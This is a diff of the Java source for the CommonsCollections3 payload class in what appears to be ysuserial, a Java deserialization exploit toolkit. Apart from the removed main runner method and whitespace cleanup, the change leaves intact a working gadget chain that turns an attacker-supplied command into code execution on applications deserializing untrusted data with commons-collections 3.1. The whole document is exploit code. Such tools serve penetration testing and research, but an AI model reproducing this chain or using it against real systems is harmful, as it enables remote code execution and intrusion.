@@ -16,7 +16,6 @@ import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
 import org.su18.ysuserial.payloads.util.JavaVersion;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
@@ -27,21 +26,21 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  */
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({ Authors.FROHOFF })
-public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
+@Authors({Authors.FROHOFF})
+public class CommonsCollections3 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		Object templatesImpl = Gadgets.createTemplatesImpl(command);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
-			new Transformer[]{ new ConstantTransformer(1) });
+				new Transformer[]{new ConstantTransformer(1)});
 		// real chain for after setup
-		final Transformer[] transformers = new Transformer[] {
+		final Transformer[] transformers = new Transformer[]{
 				new ConstantTransformer(TrAXFilter.class),
 				new InstantiateTransformer(
-						new Class[] { Templates.class },
-						new Object[] { templatesImpl } )};
+						new Class[]{Templates.class},
+						new Object[]{templatesImpl})};
 
 		final Map innerMap = new HashMap();
 
@@ -56,11 +55,7 @@ public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<
 		return handler;
 	}
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections3.class, args);
-	}
-
 	public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
-    }
+		return JavaVersion.isAnnInvHUniversalMethodImpl();
+	}
 }
